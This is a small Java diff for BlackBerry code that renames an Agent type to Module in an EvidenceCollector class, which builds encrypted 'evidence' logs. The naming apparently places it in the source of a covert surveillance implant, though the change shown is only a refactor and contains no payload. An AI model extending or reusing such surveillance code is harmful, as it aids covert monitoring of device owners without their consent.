@@ -20,7 +20,7 @@ import net.rim.device.api.system.PersistentObject;
 import net.rim.device.api.system.PersistentStore;
 import net.rim.device.api.system.RuntimeStore;
 import net.rim.device.api.util.NumberUtilities;
-import blackberry.agent.Agent;
+import blackberry.agent.Module;
 import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
@@ -166,7 +166,7 @@ public final class EvidenceCollector implements Singleton {
      *            the on sd
      * @return the log
      */
-    public synchronized Evidence factory(final Agent agent, final boolean onSD) {
+    public synchronized Evidence factory(final Module agent, final boolean onSD) {
 
         final Evidence log = new Evidence(agent.agentId, agent.onSD(),
                 keys.getAesKey());
